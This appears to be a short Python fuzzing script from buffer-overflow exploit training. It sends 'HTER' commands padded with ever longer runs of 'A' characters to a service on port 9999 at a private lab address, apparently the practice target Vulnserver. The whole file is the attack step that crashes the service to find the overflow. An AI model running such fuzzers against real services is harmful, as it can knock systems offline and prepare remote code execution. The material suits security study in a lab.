#!/usr/bin/python3

import socket

lista = ["A"]
contador = 100

while len(lista) <= 3000:
    lista.append("A" * contador)
    contador += 100

for i in lista:
    print("Enviando payload con " + str(len(i)) + " bytes") 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.100.129", 9999))
    s.recv(1024)
    s.send(("HTER " + i + "\r\n").encode())